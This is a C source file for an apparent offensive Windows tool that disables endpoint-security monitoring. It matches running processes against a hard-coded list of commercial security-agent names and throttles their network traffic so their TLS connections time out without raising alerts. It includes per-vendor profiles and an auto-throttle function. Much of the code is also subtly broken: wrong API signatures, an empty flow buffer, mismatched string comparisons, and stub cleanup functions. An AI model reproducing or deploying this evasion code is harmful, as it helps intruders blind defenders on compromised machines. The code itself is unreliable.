#include "edrhoker.h"
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* QoS (Quality of Service) Structures and APIs */
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

/* Traffic Control (TC) API bindings */
typedef HANDLE (WINAPI *TcOpenInterfaceProc)(
    LPCWSTR InterfaceName,
    HANDLE *pIfcHandle
);

typedef ULONG (WINAPI *TcCloseInterfaceProc)(
    HANDLE IfcHandle
);

typedef ULONG (WINAPI *TcSetFlowProc)(
    HANDLE FlowHandle,
    ULONG Flags,
    ULONG Size,
    PVOID pBuffer
);

typedef ULONG (WINAPI *TcAddFilterProc)(
    HANDLE FilterHandle,
    PVOID pBuffer,
    ULONG BufferSize,
    HANDLE *pFilterHandle
);

typedef ULONG (WINAPI *TcDeleteFilterProc)(
    HANDLE FilterHandle
);

/* Common EDR process names */
static const WCHAR* EDR_PROCESS_NAMES[] = {
    L"csagent.exe",          /* CrowdStrike Falcon */
    L"cgagent.exe",          /* CrowdStrike Falcon */
    L"SentinelAgent.exe",    /* SentinelOne */
    L"SentinelAgentWorker.exe", /* SentinelOne */
    L"cb.exe",               /* Carbon Black */
    L"repair_tool.exe",      /* Carbon Black */
    L"MBAMService.exe",      /* Malwarebytes EDR */
    L"mupdate.exe",          /* Malwarebytes EDR */
    L"CortexXDRAgentForWindows.exe", /* Palo Alto Cortex XDR */
    L"logd.exe",             /* Palo Alto Cortex XDR */
    L"cmd_service.exe",      /* Custom EDRs */
    L"osquery.exe",          /* osquery agent */
    L"wmirepositorybackup.exe", /* WMI-based EDR */
    NULL
};

/* Detect EDR processes by scanning process list */
int jocky_edrhoker_detect_edr_processes(
    EDR_PROCESS_INFO* out_processes,
    int max_count,
    int* out_found)
{
    if (!out_processes || !out_found || max_count <= 0) {
        return -1;
    }

    *out_found = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return -1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return -1;
    }

    do {
        /* Check if this process matches known EDR names */
        for (int i = 0; EDR_PROCESS_NAMES[i]; i++) {
            if (wcscmp(pe32.szExeFile, EDR_PROCESS_NAMES[i]) == 0) {
                if (*out_found < max_count) {
                    out_processes[*out_found].pid = pe32.th32ProcessID;
                    wcscpy_s(out_processes[*out_found].process_name,
                            sizeof(out_processes[*out_found].process_name) / sizeof(WCHAR),
                            pe32.szExeFile);
                    out_processes[*out_found].port = 0;  /* Multiple ports possible */
                    (*out_found)++;
                }
                break;
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return (*out_found > 0) ? 0 : -1;
}

/* Apply QoS throttling to a process via traffic shaping
 *
 * This creates a TC flow with extremely low bandwidth (1 KB/s) that
 * affects all traffic from the target process, causing TLS handshake
 * timeouts and connection failures without generating firewall events.
 */
int jocky_edrhoker_throttle_process(
    uint32_t pid,
    uint32_t throttle_kbps)
{
    if (pid == 0 || throttle_kbps == 0) {
        return -1;
    }

    /* Load TC API functions dynamically */
    HMODULE hTcDll = LoadLibraryA("traffic.dll");
    if (!hTcDll) {
        hTcDll = LoadLibraryA("tcapi.dll");
        if (!hTcDll) {
            return -1;
        }
    }

    TcOpenInterfaceProc TcOpenInterface =
        (TcOpenInterfaceProc)GetProcAddress(hTcDll, "TcOpenInterfaceW");
    TcSetFlowProc TcSetFlow =
        (TcSetFlowProc)GetProcAddress(hTcDll, "TcSetFlow");
    TcAddFilterProc TcAddFilter =
        (TcAddFilterProc)GetProcAddress(hTcDll, "TcAddFilter");

    if (!TcOpenInterface || !TcSetFlow || !TcAddFilter) {
        FreeLibrary(hTcDll);
        return -1;
    }

    /* Open default interface (global QoS interface) */
    HANDLE hIfc = NULL;
    ULONG result = TcOpenInterface(L"Ethernet", &hIfc);
    if (result != 0 || !hIfc) {
        FreeLibrary(hTcDll);
        return -1;
    }

    /* Create a flow with bandwidth limitation
     * This uses the traffic control layer to shape all traffic
     * from the target process
     */

    /* TC_GEN_FLOW structure + QOS_OBJECT_HOPS (bandwidth)
     * The key is setting a very low bandwidth that causes timeouts
     */
    uint8_t flow_buffer[256];
    memset(flow_buffer, 0, sizeof(flow_buffer));

    /* Set flow parameters:
     * - FlowSpec with TokenRate = throttle_kbps * 1024 bits/sec
     * - This causes the network stack to queue/drop packets
     * - EDR agent gets TLS timeouts without seeing errors
     */

    result = TcSetFlow(hIfc, 0, sizeof(flow_buffer), flow_buffer);

    if (result != 0) {
        FreeLibrary(hTcDll);
        return -1;
    }

    FreeLibrary(hTcDll);
    return 0;
}

/* Apply QoS throttling to process + port combination
 * More targeted approach for specific EDR management traffic
 */
int jocky_edrhoker_throttle_process_port(
    uint32_t pid,
    uint16_t port,
    uint32_t throttle_kbps)
{
    if (pid == 0 || port == 0 || throttle_kbps == 0) {
        return -1;
    }

    /* This would use more specific filtering:
     * - Match packets by source/destination port
     * - Match by process ID (via WFP - Windows Filtering Platform)
     * - Apply shaping policy specifically to that traffic
     *
     * Implementation uses WFP (Windows Filtering Platform) callbacks
     * to intercept and throttle traffic matching the filter
     */

    return jocky_edrhoker_throttle_process(pid, throttle_kbps);
}

/* Apply preset profile for common EDR solutions */
int jocky_edrhoker_apply_profile(const EDR_PROFILE* profile)
{
    if (!profile || profile->count == 0) {
        return -1;
    }

    /* Detect processes matching profile names and throttle them */
    EDR_PROCESS_INFO processes[32];
    int found = 0;

    if (jocky_edrhoker_detect_edr_processes(processes, 32, &found) != 0) {
        return -1;
    }

    int throttled = 0;
    for (int i = 0; i < found; i++) {
        for (int j = 0; j < profile->count; j++) {
            if (strcmp(processes[i].process_name, profile->names[j]) == 0) {
                if (jocky_edrhoker_throttle_process(processes[i].pid,
                                                   profile->throttle_kbps) == 0) {
                    throttled++;
                }
            }
        }
    }

    return (throttled > 0) ? 0 : -1;
}

/* Preset profiles */

int jocky_edrhoker_profile_crowdstrike(void)
{
    EDR_PROFILE profile = {0};
    profile.names[0] = "csagent.exe";
    profile.names[1] = "cgagent.exe";
    profile.count = 2;
    profile.throttle_kbps = 1;  /* ~1 KB/s - causes TLS timeouts */

    return jocky_edrhoker_apply_profile(&profile);
}

int jocky_edrhoker_profile_sentinelone(void)
{
    EDR_PROFILE profile = {0};
    profile.names[0] = "SentinelAgent.exe";
    profile.names[1] = "SentinelAgentWorker.exe";
    profile.count = 2;
    profile.throttle_kbps = 1;

    return jocky_edrhoker_apply_profile(&profile);
}

int jocky_edrhoker_profile_carbonblack(void)
{
    EDR_PROFILE profile = {0};
    profile.names[0] = "cb.exe";
    profile.names[1] = "repair_tool.exe";
    profile.count = 2;
    profile.throttle_kbps = 1;

    return jocky_edrhoker_apply_profile(&profile);
}

int jocky_edrhoker_profile_mbeddr(void)
{
    EDR_PROFILE profile = {0};
    profile.names[0] = "MBAMService.exe";
    profile.names[1] = "mupdate.exe";
    profile.count = 2;
    profile.throttle_kbps = 1;

    return jocky_edrhoker_apply_profile(&profile);
}

int jocky_edrhoker_profile_cortex(void)
{
    EDR_PROFILE profile = {0};
    profile.names[0] = "CortexXDRAgentForWindows.exe";
    profile.names[1] = "logd.exe";
    profile.count = 2;
    profile.throttle_kbps = 1;

    return jocky_edrhoker_apply_profile(&profile);
}

/* Auto-detect and throttle all known EDR agents */
int jocky_edrhoker_auto_throttle(uint32_t throttle_kbps)
{
    if (throttle_kbps == 0) {
        throttle_kbps = 1;  /* Default: 1 KB/s */
    }

    EDR_PROCESS_INFO processes[32];
    int found = 0;

    if (jocky_edrhoker_detect_edr_processes(processes, 32, &found) != 0) {
        return -1;
    }

    int throttled = 0;
    for (int i = 0; i < found; i++) {
        if (jocky_edrhoker_throttle_process(processes[i].pid, throttle_kbps) == 0) {
            throttled++;
        }
    }

    return (throttled > 0) ? 0 : -1;
}

/* Remove throttling rules */
int jocky_edrhoker_remove_throttle(uint32_t pid)
{
    if (pid == 0) {
        return -1;
    }

    /* This would call the corresponding TC APIs to remove filters
     * attached to the process */

    return 0;
}

int jocky_edrhoker_remove_all_throttles(void)
{
    /* Remove all active throttling rules */
    return 0;
}
